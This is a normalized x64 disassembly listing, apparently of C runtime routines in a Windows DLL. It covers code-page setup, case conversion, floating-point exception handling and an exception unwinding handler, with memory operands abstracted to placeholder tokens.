call sub_18001fefc
mov rax [ rw-data ]
mov [ rdi + 0xb8 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x30 ] rax
[ rax ]
mov rbx [ rsp + 0x30 ]
[ rbx ]
jne r-xdata
test rbx rbx
jne r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
call sub_180018b3c
sub_18001e874
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_180018cdc
and [ rw-data ] 0x0
cmp ebx 0xfffffffe
jne r-xdata
cmp ebx 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp ebx 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rax [ rsp + 0x20 ]
mov [ rw-data ] 0x1
mov eax [ rax + 0x4 ]
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_18001e904
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x38 ] rax
mov rsi rdx
call sub_18001e874
xor ebx ebx
mov edi eax
test eax eax
jne r-xdata
lea r13 [ rw-data ]
mov ecx ebx
mov rbp rbx
mov rax r13
mov r12d 0x1
mov rcx rsi
call sub_18001e53c
jmp r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_18001d7d0
lea r10 [ rbp + rbp * 2 ]
lea r11 [ rw-data ]
shl r10 0x4
mov ebp 0x4
lea r8 [ r10 + r13 + 0x10 ]
add ecx r12d
add rbp r12
add rax 0x30
cmp ecx 0x5
jb r-xdata
xor eax eax
add r8 0x8
add r11 r12
sub rbp r12
jne r-xdata
cmp [ rcx + 0x1 ] bl
je r-xdata
cmp [ rax ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov rcx r8
cmp [ r8 ] bl
je r-xdata
mov [ rsi + 0x4 ] edi
sub edi 0x3a4
mov [ rsi + 0x8 ] r12d
je r-xdata
movzx edx [ rcx ]
movzx eax [ rcx + 0x1 ]
cmp edx eax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi 0xfde9
je r-xdata
mov ebx 0x411
sub edi 0x4
je r-xdata
add rcx 0x2
cmp [ rcx ] bl
jne r-xdata
lea r9 [ rdx + rsi + 0x1d ]
mov rcx [ rsp + 0x38 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0x80 ]
add rsp 0x40
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
movzx ecx di
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
movzx eax [ rdi + rcx ]
mov [ rcx ] ax
add rcx 0x2
sub rdx r12
jne r-xdata
mov rcx rsi
call sub_18001e5c8
mov ebx 0x804
jmp r-xdata
sub edi 0xd
je r-xdata
mov al [ r11 ]
add edx r12d
or [ r9 ] al
movzx eax [ rcx + 0x1 ]
add r9 r12
cmp edx eax
jbe r-xdata
lea rdx [ rsp + 0x20 ]
mov ecx edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
sub r10 rsi
mov [ rsi + 0xc ] ebx
lea rcx [ rsi + 0x10 ]
lea rdi [ r10 + r13 - 0xc ]
mov edx 0x6
mov ebx 0x412
jmp r-xdata
dec edi
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_18001d7d0
mov [ rsi + 0x4 ] edi
mov [ rsi + 0xc ] ebx
cmp [ rsp + 0x20 ] r12d
jbe r-xdata
mov ebx 0x404
jmp r-xdata
mov [ rsi + 0x8 ] ebx
lea rax [ rsp + 0x26 ]
cmp [ rsp + 0x26 ] bl
je r-xdata
lea rax [ rsi + 0x1e ]
mov ecx 0xfe
cmp [ rax + 0x1 ] bl
je r-xdata
or [ rax ] 0x8
add rax r12
sub rcx r12
jne r-xdata
mov ecx [ rsi + 0x4 ]
sub ecx 0x3a4
je r-xdata
movzx edi [ rax ]
movzx ecx [ rax + 0x1 ]
cmp edi ecx
ja r-xdata
mov eax 0x411
sub ecx 0x4
je r-xdata
add rax 0x2
cmp [ rax ] bl
jne r-xdata
sub ecx edi
lea rdx [ rdi + rsi + 0x1d ]
add ecx r12d
lea rdi [ rsi + 0x10 ]
movzx eax bx
mov ecx 0x6
[ rdi ]
jmp r-xdata
mov eax 0x804
jmp r-xdata
sub ecx 0xd
je r-xdata
or [ rdx ] 0x4
add rdx r12
sub rcx r12
jne r-xdata
mov [ rsi + 0xc ] eax
mov [ rsi + 0x8 ] r12d
jmp r-xdata
mov eax 0x412
jmp r-xdata
dec ecx
je r-xdata
mov eax 0x404
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_18001eb7c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
sub rsp 0x30
mov edi ecx
or r13d 0xffffffff
call sub_18001e320
mov rsi rax
call sub_18001e7b8
mov rbx [ rsi + 0xb8 ]
mov ecx edi
call sub_18001e874
mov r12d eax
cmp eax [ rbx + 0x4 ]
je r-xdata
xor edi edi
mov r13d edi
mov ecx 0x220
call sub_18001b71c
mov rbx rax
xor edi edi
test rax rax
je r-xdata
mov eax r13d
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
mov r12 [ rsp + 0x58 ]
add rsp 0x30
pop r13
retn
mov rdx [ rsi + 0xb8 ]
mov rcx rax
mov r8d 0x220
call sub_180018670
mov [ rbx ] edi
mov rdx rbx
mov ecx r12d
call sub_18001e904
mov r13d eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov rcx [ rsi + 0xb8 ]
lea r12 [ rw-data ]
[ rcx ]
jne r-xdata
lea r12 [ rw-data ]
cmp rbx r12
je r-xdata
mov [ rsi + 0xb8 ] rbx
[ rbx ]
test [ rsi + 0xc8 ] 0x2
jne r-xdata
mov rcx [ rsi + 0xb8 ]
cmp rcx r12
je r-xdata
call sub_1800194ec
mov [ rax ] 0x16
jmp r-xdata
mov rcx rbx
call sub_180018b3c
test [ rw-data ] 0x1
jne r-xdata
call sub_180018b3c
mov esi 0xd
mov ecx esi
call sub_180022e38
nop
mov eax [ rbx + 0x4 ]
mov [ rw-data ] eax
mov eax [ rbx + 0x8 ]
mov [ rw-data ] eax
mov eax [ rbx + 0xc ]
mov [ rw-data ] eax
mov edx edi
lea r8 [ __dos_header ]
mov edx edi
movsxd rcx edx
movzx eax [ rbx + rcx * 2 + 0x10 ]
mov [ r8 + rcx * 2 + 0x3db20 ] ax
inc edx
jmp r-xdata
mov [ rsp + 0x20 ] edi
cmp edi 0x100
jge r-xdata
movsxd rcx edx
mov al [ rcx + rbx + 0x1c ]
mov [ rcx + r8 + 0x3bb50 ] al
inc edx
jmp r-xdata
mov [ rsp + 0x20 ] edx
cmp edx 0x5
jge r-xdata
mov rax [ rw-data ]
[ rax ]
jne r-xdata
movsxd rcx edi
mov al [ rcx + rbx + 0x11d ]
mov [ rcx + r8 + 0x3bc60 ] al
inc edi
jmp r-xdata
mov [ rsp + 0x20 ] edx
cmp edx 0x101
jge r-xdata
mov [ rw-data ] rbx
[ rbx ]
mov ecx esi
call sub_180022d38
jmp r-xdata
mov rcx [ rw-data ]
cmp rcx r12
je r-xdata
call sub_180018b3c
sub_18001ed84
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] cx
push rbp
mov rbp rsp
sub rsp 0x50
mov eax 0xffff
cmp cx ax
je r-xdata
mov rbx [ rsp + 0x68 ]
add rsp 0x50
pop rbp
retn
lea rcx [ rbp - 0x20 ]
call sub_180018cdc
mov rbx [ rbp - 0x20 ]
cmp [ rbx + 0x14 ] 0x0
jne r-xdata
movzx ecx [ rbp + 0x10 ]
mov edx 0x100
cmp cx dx
jae r-xdata
movzx edx [ rbp + 0x10 ]
lea eax [ rdx - 0x41 ]
cmp ax 0x19
ja r-xdata
mov ecx [ rbx + 0x14 ]
lea rax [ rbp + 0x20 ]
mov r9d 0x1
mov [ rsp + 0x28 ] r9d
lea r8 [ rbp + 0x10 ]
mov [ rsp + 0x20 ] rax
call sub_18001b410
test eax eax
movzx eax [ rbp + 0x10 ]
je r-xdata
mov edx 0x1
call sub_180026ae0
test eax eax
jne r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
add dx 0x20
cmp [ rbp - 0x8 ] 0x0
je r-xdata
movzx eax [ rbp + 0x20 ]
movzx ecx [ rbp + 0x10 ]
mov rax [ rbx + 0x148 ]
movzx eax [ rax + rcx ]
jmp r-xdata
movzx eax [ rbp + 0x10 ]
jmp r-xdata
movzx eax dx
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18001ee5c
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov [ rax + 0x8 ] rcx
push rbp
mov rbp rsp
sub rsp 0x20
mov rbx rdx
xor edx edx
mov esi r9d
mov [ rcx + 0x4 ] edx
mov rax [ rbp + 0x10 ]
mov [ rax + 0x8 ] edx
mov rax [ rbp + 0x10 ]
mov [ rax + 0xc ] edx
test r8b 0x10
je r-xdata
mov edi [ rbp + 0x40 ]
mov rax [ rbp + 0x10 ]
mov edi 0xc000008f
or [ rax + 0x4 ] 0x1
jmp r-xdata
test r8b 0x1
je r-xdata
mov rax [ rbp + 0x10 ]
mov edi 0xc0000093
or [ rax + 0x4 ] 0x2
test r8b 0x2
je r-xdata
test r8b 0x4
je r-xdata
mov rax [ rbp + 0x10 ]
mov edi 0xc0000091
or [ rax + 0x4 ] 0x4
test r8b 0x8
je r-xdata
mov rax [ rbp + 0x10 ]
mov edi 0xc000008e
or [ rax + 0x4 ] 0x8
mov rcx [ rbp + 0x10 ]
mov rax [ rbx ]
shr rax 0x7
shl eax 0x4
not eax
xor eax [ rcx + 0x8 ]
and eax 0x10
xor [ rcx + 0x8 ] eax
mov rcx [ rbp + 0x10 ]
mov rax [ rbx ]
shr rax 0x9
shl eax 0x3
not eax
xor eax [ rcx + 0x8 ]
and eax 0x8
xor [ rcx + 0x8 ] eax
mov rcx [ rbp + 0x10 ]
mov rax [ rbx ]
shr rax 0xa
shl eax 0x2
not eax
xor eax [ rcx + 0x8 ]
and eax 0x4
xor [ rcx + 0x8 ] eax
mov rcx [ rbp + 0x10 ]
mov rax [ rbx ]
shr rax 0xb
add eax eax
not eax
xor eax [ rcx + 0x8 ]
and eax 0x2
xor [ rcx + 0x8 ] eax
mov eax [ rbx ]
mov rcx [ rbp + 0x10 ]
shr rax 0xc
not eax
xor eax [ rcx + 0x8 ]
and eax 0x1
xor [ rcx + 0x8 ] eax
call sub_18001f8b0
mov r11 rax
test al 0x1
je r-xdata
mov rax [ rbp + 0x10 ]
mov edi 0xc0000090
or [ rax + 0x4 ] 0x10
test al 0x4
je r-xdata
mov rcx [ rbp + 0x10 ]
or [ rcx + 0xc ] 0x10
test al 0x8
je r-xdata
mov rcx [ rbp + 0x10 ]
or [ rcx + 0xc ] 0x8
test r11b 0x10
je r-xdata
mov rax [ rbp + 0x10 ]
or [ rax + 0xc ] 0x4
test r11b 0x20
je r-xdata
mov rax [ rbp + 0x10 ]
or [ rax + 0xc ] 0x2
mov eax [ rbx ]
mov ecx 0x6000
and rax rcx
je r-xdata
mov rax [ rbp + 0x10 ]
or [ rax + 0xc ] 0x1
mov rax [ rbp + 0x10 ]
and [ rax ] 0xfffffffc
cmp rax 0x2000
je r-xdata
mov rcx [ rbp + 0x10 ]
mov r8d 0xffffffe3
mov eax [ rcx + 0x20 ]
and eax r8d
or eax 0x2
mov [ rcx + 0x20 ] eax
mov rax [ rbp + 0x30 ]
mov rcx [ rax ]
mov rax [ rbp + 0x10 ]
mov [ rax + 0x10 ] rcx
mov rax [ rbp + 0x10 ]
or [ rax + 0x60 ] 0x1
mov rdx [ rbp + 0x10 ]
mov eax [ rdx + 0x60 ]
and eax r8d
or eax 0x2
mov [ rdx + 0x60 ] eax
mov rax [ rbp + 0x10 ]
mov rdx [ rsi ]
mov [ rax + 0x50 ] rdx
mov rax [ rbp + 0x10 ]
mov edx 0xffffffe1
and [ rax + 0x20 ] edx
mov rax [ rbp + 0x30 ]
mov ecx [ rax ]
mov rax [ rbp + 0x10 ]
mov [ rax + 0x10 ] ecx
mov rax [ rbp + 0x10 ]
or [ rax + 0x60 ] 0x1
mov rax [ rbp + 0x10 ]
and [ rax + 0x60 ] edx
mov rax [ rbp + 0x10 ]
mov ecx [ rsi ]
mov [ rax + 0x50 ] ecx
jmp r-xdata
mov rax [ rbp + 0x10 ]
and [ rax ] 0xfffffffd
mov rax [ rbp + 0x10 ]
or [ rax ] 0x1
jmp r-xdata
cmp rax 0x4000
je r-xdata
test [ r11 + 0x8 ] 0x8
je r-xdata
btr [ rbx ] 0x7
call sub_18001f8c4
xor edx edx
lea r9 [ rbp + 0x10 ]
lea r8d [ rdx + 0x1 ]
mov ecx edi
call [ RaiseException@IAT ]
mov r11 [ rbp + 0x10 ]
test [ r11 + 0x8 ] 0x10
je r-xdata
mov rax [ rbp + 0x10 ]
and esi 0xfff
and [ rax ] 0xfffe001f
mov rax [ rbp + 0x10 ]
shl esi 0x5
or [ rax ] esi
mov rax [ rbp + 0x10 ]
mov rsi [ rbp + 0x38 ]
or [ rax + 0x20 ] 0x1
cmp [ rbp + 0x40 ] 0x0
je r-xdata
mov rax [ rbp + 0x10 ]
and [ rax ] 0xfffffffe
mov rax [ rbp + 0x10 ]
or [ rax ] 0x2
jmp r-xdata
cmp rax rcx
jne r-xdata
test [ r11 + 0x8 ] 0x4
je r-xdata
btr [ rbx ] 0x9
mov rax [ rbp + 0x10 ]
or [ rax ] 0x3
jmp r-xdata
test [ r11 + 0x8 ] 0x2
je r-xdata
btr [ rbx ] 0xa
test [ r11 + 0x8 ] 0x1
je r-xdata
btr [ rbx ] 0xb
mov eax [ r11 ]
and eax 0x3
je r-xdata
btr [ rbx ] 0xc
and [ rbx ] 0xffffffffffff9fff
dec eax
je r-xdata
mov rax [ r11 + 0x50 ]
mov [ rsi ] rax
mov eax [ r11 + 0x50 ]
mov [ rsi ] eax
jmp r-xdata
btr [ rbx ] 0xe
bts [ rbx ] 0xd
jmp r-xdata
dec eax
je r-xdata
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop rbp
retn
cmp [ rbp + 0x40 ] 0x0
je r-xdata
btr [ rbx ] 0xd
bts [ rbx ] 0xe
jmp r-xdata
dec eax
jne r-xdata
or [ rbx ] 0x6000
jmp r-xdata
sub_18001f168
mov [ rsp + 0x10 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
xor ebp ebp
mov ebx ecx
movaps [ rsp + 0x20 ] xmm6
and ebx 0x1f
mov r13 r8
mov rsi rdx
mov r14d ecx
lea r15d [ rbp + 0x10 ]
test cl 0x8
je r-xdata
mov ecx 0x4
test cl r14b
je r-xdata
test r8b r8b
jns r-xdata
mov edi 0x1
test dil r14b
je r-xdata
bt r8 0x9
jae r-xdata
lea ecx [ rbp + 0x1 ]
call sub_18001f960
and ebx 0xfffffff7
jmp r-xdata
test r14b 0x2
je r-xdata
bt r8 0xa
jae r-xdata
call sub_18001f960
and ebx 0xfffffffb
jmp r-xdata
test r15b r14b
je r-xdata
bt r8 0xb
jae r-xdata
lea ecx [ rdi + 0x7 ]
call sub_18001f960
mov r11 r13
mov eax 0x6000
and r11 rax
je r-xdata
movaps xmm6 [ rsp + 0x20 ]
test ebx ebx
mov rbx [ rsp + 0x78 ]
sete bpl
mov eax ebp
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
bt r13 0xc
jae r-xdata
movsd xmm0 [ rdx ]
xorpd xmm6 xmm6
test r15b r14b
mov r12d ebp
cmovne r12d edi
ucomisd xmm0 xmm6
jpe r-xdata
movsd xmm0 [ rsi ]
comisd xmm0 [ r--data ]
jbe r-xdata
cmp r11 0x2000
je r-xdata
mov ecx 0x20
call sub_18001f960
and ebx 0xffffffef
lea rdx [ rsp + 0x70 ]
call sub_18001f770
mov ecx [ rsp + 0x70 ]
add ecx 0xfffffa00
movsd [ rsp + 0x88 ] xmm0
cmp ecx 0xfffffbce
jge r-xdata
jne r-xdata
movsd xmm0 [ rw-data ]
movsd xmm0 [ rw-data ]
jmp r-xdata
movsd xmm0 [ rsi ]
comisd xmm0 [ r--data ]
jbe r-xdata
cmp r11 0x4000
je r-xdata
comisd xmm6 xmm0
mov edx edi
ja r-xdata
mulsd xmm0 xmm6
mov r12d edi
jmp r-xdata
mov r12d edi
jmp r-xdata
movsd [ rsi ] xmm0
movsd xmm0 [ rw-data ]
jmp r-xdata
movsd xmm0 [ rsi ]
comisd xmm0 [ r--data ]
ja r-xdata
cmp r11 rax
jne r-xdata
mov rax [ rsp + 0x88 ]
shr rax 0x30
and ax 0xf
or ax r15w
mov [ rsp + 0x8e ] ax
cmp ecx 0xfffffc03
jge r-xdata
mov edx ebp
movsd [ rsi ] xmm0
test r12d r12d
je r-xdata
movsd xmm0 [ rw-data ]
jmp r-xdata
and ebx 0xfffffffe
jmp r-xdata
movsd xmm0 [ rsi ]
comisd xmm0 [ r--data ]
movsd xmm0 [ rw-data ]
ja r-xdata
movsd xmm0 [ rsp + 0x88 ]
test edx edx
je r-xdata
mov eax [ rsp + 0x88 ]
mov r8d 0xfffffc03
sub r8d ecx
mov ecx [ rsp + 0x8c ]
and ebx 0xfffffffd
mov rcx r15
call sub_18001f960
xorpd xmm0 [ r--data ]
jmp r-xdata
xorpd xmm0 [ r--data ]
shr eax 0x1
mov [ rsp + 0x88 ] eax
test dil cl
je r-xdata
test r12d r12d
cmove r12d edi
shr ecx 0x1
sub r8 rdi
jne r-xdata
bts eax 0x1f
mov [ rsp + 0x88 ] eax
test dil al
je r-xdata
mov [ rsp + 0x8c ] ecx
sub_18001f3d4
sub rsp 0x28
cmp ecx 0x1
je r-xdata
call sub_1800194ec
mov [ rax ] 0x21
jle r-xdata
add rsp 0x28
retn
cmp ecx 0x3
jg r-xdata
call sub_1800194ec
mov [ rax ] 0x22
jmp r-xdata
sub_18001f404
mov eax ecx
test cl 0x20
je r-xdata
test al 0x8
je r-xdata
mov ecx 0x5
jmp r-xdata
test al 0x4
je r-xdata
mov ecx 0x1
jmp r-xdata
mov eax ecx
retn
mov ecx 0x1
test cl al
je r-xdata
mov ecx 0x2
jmp r-xdata
movzx eax al
mov ecx 0x2
and ecx eax
add ecx ecx
mov ecx 0x3
jmp r-xdata
sub_18001f448
movsd [ rsp + 0x20 ] xmm3
movsd [ rsp + 0x18 ] xmm2
push rbx
sub rsp 0x50
lea r9 [ rw-data ]
mov ebx ecx
xor r8d r8d
mov rax r9
movsxd rax r8d
add rax rax
mov rax [ r9 + rax * 8 + 0x8 ]
lea rcx [ rw-data ]
add rax 0x10
inc r8d
cmp rax rcx
jl r-xdata
call sub_18001f8e4
mov ecx ebx
call sub_18001f3d4
movsd xmm0 [ rsp + 0x80 ]
mov eax [ rsp + 0x70 ]
mov [ rsp + 0x20 ] ebx
mov [ rsp + 0x30 ] eax
mov eax [ rsp + 0x74 ]
mov [ rsp + 0x34 ] eax
mov eax [ rsp + 0x78 ]
mov [ rsp + 0x38 ] eax
mov eax [ rsp + 0x7c ]
mov [ rsp + 0x3c ] eax
mov eax [ rsp + 0x80 ]
mov [ rsp + 0x40 ] eax
mov eax [ rsp + 0x84 ]
mov [ rsp + 0x44 ] eax
call sub_18001f8e4
lea rcx [ rsp + 0x20 ]
call sub_180026b48
test eax eax
jne r-xdata
cmp [ rax ] edx
je r-xdata
xor eax eax
jmp r-xdata
movsd xmm0 [ rsp + 0x40 ]
jmp r-xdata
mov ecx ebx
call sub_18001f3d4
mov rcx [ rsp + 0x88 ]
mov [ rsp + 0x28 ] rax
mov edx 0xffc0
test rax rax
je r-xdata
add rsp 0x50
pop rbx
retn
sub_18001f51c
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movaps [ rsp + 0x30 ] xmm6
movapd xmm6 xmm1
addsd xmm6 xmm2
mov rbx r9
jne r-xdata
call sub_1800194ec
mov edx 0xffc0
mov rcx rbx
mov [ rax ] 0x21
call sub_18001f8e4
movapd xmm0 xmm6
movapd xmm3 xmm2
mov edx ecx
movapd xmm2 xmm1
mov ecx 0x1
mov [ rsp + 0x28 ] rbx
movsd [ rsp + 0x20 ] xmm6
call sub_18001f448
jmp r-xdata
movaps xmm6 [ rsp + 0x30 ]
add rsp 0x40
pop rbx
retn
sub_18001f584
mov rax rsp
mov [ rax + 0x10 ] rbx
push rbp
push rsi
push rdi
lea rbp [ rax - 0x4f ]
sub rsp 0xf0
movaps [ rax - 0x28 ] xmm6
movaps [ rax - 0x38 ] xmm7
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x7 ] rax
mov rbx [ rbp + 0x7f ]
mov esi edx
lea rdx [ rbp + 0x77 ]
movsd [ rbp - 0x79 ] xmm2
movapd xmm6 xmm3
movapd xmm7 xmm2
mov r8 rbx
mov edi ecx
call sub_18001f168
test eax eax
jne r-xdata
mov ecx edi
call sub_18001f404
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rbp - 0x29 ]
and [ rsp + 0x30 ] 0x0
lea rdx [ rbp + 0x7f ]
movsd [ rbp - 0x39 ] xmm6
and eax 0xffffffe3
lea rcx [ rbp - 0x69 ]
mov r9d esi
or eax 0x3
mov r8d edi
mov [ rbp - 0x29 ] eax
lea rax [ rbp + 0x77 ]
mov [ rsp + 0x28 ] rax
lea rax [ rbp - 0x79 ]
mov [ rsp + 0x20 ] rax
call sub_18001ee5c
mov rbx [ rbp + 0x7f ]
mov ecx eax
call sub_18001f3d4
mov edx 0xffc0
mov rcx rbx
call sub_18001f8e4
movsd xmm0 [ rbp + 0x77 ]
test eax eax
je r-xdata
movsd xmm0 [ rbp + 0x77 ]
movapd xmm3 xmm6
movapd xmm2 xmm7
mov edx esi
mov ecx eax
mov [ rsp + 0x28 ] rbx
movsd [ rsp + 0x20 ] xmm0
call sub_18001f448
jmp r-xdata
mov rcx [ rbp + 0x7 ]
xor rcx rsp
call sub_180018450
lea r11 [ rsp + 0xf0 ]
mov rbx [ r11 + 0x28 ]
movaps xmm6 [ r11 - 0x10 ]
movaps xmm7 [ r11 - 0x20 ]
mov rsp r11
pop rdi
pop rsi
pop rbp
retn
sub_18001f6c4
movsd [ rsp + 0x8 ] xmm0
mov rax [ rsp + 0x8 ]
mov ecx 0x800f
shr rax 0x30
movsd [ rsp + 0x18 ] xmm0
and ax cx
mov ecx 0x3fe
add dx cx
shl dx 0x4
or ax dx
mov [ rsp + 0x1e ] ax
movsd xmm0 [ rsp + 0x18 ]
retn
sub_18001f6fc
movsd [ rsp + 0x8 ] xmm0
mov rax [ rsp + 0x8 ]
mov rcx rax
shr rcx 0x20
cmp ecx 0x7ff00000
jne r-xdata
cmp ecx 0xfff00000
jne r-xdata
test eax eax
jne r-xdata
mov r8d 0x7ff8
mov rdx rax
shr rdx 0x30
and dx r8w
cmp dx r8w
jne r-xdata
test eax eax
jne r-xdata
mov eax 0x1
retn
mov r8d 0x7ff0
cmp dx r8w
jne r-xdata
mov eax 0x3
retn
mov eax 0x2
retn
xor eax eax
retn
test ecx 0x7ffff
jne r-xdata
mov eax 0x4
retn
test eax eax
je r-xdata
sub_18001f770
movapd xmm1 xmm0
movsd [ rsp + 0x8 ] xmm0
xorpd xmm0 xmm0
mov r10 rdx
ucomisd xmm1 xmm0
jpe r-xdata
mov rax [ rsp + 0x8 ]
mov ecx 0x7ff0
mov rdx rax
shr rdx 0x30
test cx dx
jne r-xdata
jne r-xdata
mov ecx 0xbfef
movsd [ rsp + 0x10 ] xmm1
movsd [ rsp + 0x18 ] xmm1
mov rax [ rsp + 0x18 ]
shr rax 0x30
and ax cx
mov ecx 0x3fe0
or ax cx
mov ecx 0x7ff
mov [ rsp + 0x16 ] ax
movzx eax [ rsp + 0xe ]
shr ax 0x4
movsd xmm0 [ rsp + 0x10 ]
and ax cx
movsx r8d ax
sub r8d 0x3fe
mov ecx [ rsp + 0x8 ]
shr rax 0x20
test eax 0xfffff
jne r-xdata
xor r8d r8d
jmp r-xdata
comisd xmm0 xmm1
mov r8d 0xfffffc03
jbe r-xdata
test ecx ecx
je r-xdata
mov [ r10 ] r8d
retn
xor r9d r9d
mov r9d 0x1
jmp r-xdata
movzx eax [ rsp + 0xe ]
mov ecx 0xffef
and ax cx
mov [ rsp + 0xe ] ax
test r9d r9d
je r-xdata
mov eax [ rsp + 0xc ]
test dl 0x10
jne r-xdata
movsd xmm0 [ rsp + 0x8 ]
mov ecx 0xbfef
movsd [ rsp + 0x10 ] xmm0
movsd [ rsp + 0x8 ] xmm0
mov rax [ rsp + 0x10 ]
shr rax 0x30
and ax cx
mov ecx 0x3fe0
or ax cx
mov [ rsp + 0xe ] ax
movsd xmm0 [ rsp + 0x8 ]
jmp r-xdata
mov ecx 0x8000
or ax cx
mov [ rsp + 0xe ] ax
add ecx ecx
dec r8d
test [ rsp + 0xe ] 0x10
je r-xdata
or eax 0x1
mov [ rsp + 0xc ] eax
add eax eax
mov [ rsp + 0xc ] eax
test ecx ecx
jns r-xdata
mov [ rsp + 0x8 ] ecx
sub_18001f8e4
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
call sub_180026b60
mov esi eax
mov [ rsp + 0x38 ] eax
mov ecx ebx
not ecx
or ecx 0xffff807f
and ecx eax
and edi ebx
or ecx edi
mov [ rsp + 0x30 ] ecx
cmp [ rw-data ] 0x0
je r-xdata
and ecx 0xffffffbf
call sub_180026b70
test cl 0x40
je r-xdata
call sub_180026b70
jmp r-xdata
jmp r-xdata
mov eax esi
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
sub_18001f980
mov r11 rsp
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x18 ] rbp
mov [ r11 + 0x20 ] rsi
mov [ r11 + 0x10 ] rdx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r15 [ r9 + 0x8 ]
mov r14 [ r9 ]
mov eax [ rcx + 0x4 ]
mov rdi [ r9 + 0x38 ]
sub r14 r15
mov r12 r9
mov r13 rdx
mov rbp rcx
test al 0x66
jne r-xdata
mov r8 [ r9 + 0x20 ]
xor ebp ebp
xor r13d r13d
sub r8 r15
test al 0x20
je r-xdata
movsxd rsi [ r9 + 0x48 ]
mov [ r11 - 0x38 ] rcx
mov [ r11 - 0x30 ] r8
mov rax rsi
cmp esi [ rdi ]
jae r-xdata
movsxd rsi [ r9 + 0x48 ]
mov rbx rsi
cmp esi [ rdi ]
jae r-xdata
xor edx edx
cmp [ rdi ] edx
jbe r-xdata
mov eax 0x1
add rax rax
lea rbx [ rdi + rax * 8 + 0xc ]
inc rbx
shl rbx 0x4
add rbx rdi
lea rcx [ rdi + 0x8 ]
inc esi
add rbx 0x10
cmp esi [ rdi ]
jae r-xdata
mov eax [ rbx - 0x4 ]
cmp r14 rax
jae r-xdata
inc esi
add rbx 0x10
cmp esi [ rdi ]
jb r-xdata
mov eax [ rbx - 0x8 ]
cmp r14 rax
jae r-xdata
inc edx
add rcx 0x10
cmp edx [ rdi ]
jae r-xdata
mov eax [ rcx ]
cmp r8 rax
jbe r-xdata
jmp r-xdata
cmp [ rbx + 0x4 ] 0x0
je r-xdata
mov eax [ rbx - 0xc ]
cmp r14 rax
jb r-xdata
test r13d r13d
je r-xdata
jmp r-xdata
mov eax edx
add rax rax
mov ecx [ rdi + rax * 8 + 0x10 ]
test ecx ecx
jne r-xdata
mov eax [ rbx - 0x8 ]
cmp r14 rax
jb r-xdata
cmp [ rbx ] 0x1
je r-xdata
test ebp ebp
je r-xdata
cmp r13d [ rbx ]
je r-xdata
mov eax [ rcx - 0x4 ]
cmp r8 rax
jb r-xdata
mov r13d ecx
mov ebp [ rdi + rax * 8 + 0xc ]
jmp r-xdata
cmp [ rbp ] 0xe06d7363
jne r-xdata
mov eax [ rbx ]
lea rcx [ rsp + 0x30 ]
mov rdx r13
add rax r15
call rax
test eax eax
js r-xdata
cmp [ rbx ] 0x0
jne r-xdata
cmp ebp [ rbx - 0x4 ]
je r-xdata
mov ecx [ rbx + 0x4 ]
mov r8d 0x1
mov rdx r13
add rcx r15
call sub_180023f10
mov rax [ r12 + 0x40 ]
mov edx [ rbx + 0x4 ]
movsxd r9 [ rbp ]
mov [ rsp + 0x28 ] rax
mov rax [ r12 + 0x28 ]
add rdx r15
mov r8 rbp
mov rcx r13
mov [ rsp + 0x20 ] rax
call [ RtlUnwindEx@IAT ]
call sub_180023f40
cmp [ r--data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
jle r-xdata
mov rdx [ rsp + 0x78 ]
lea eax [ rsi + 0x1 ]
mov cl 0x1
mov [ r12 + 0x48 ] eax
mov r8d [ rbx - 0x4 ]
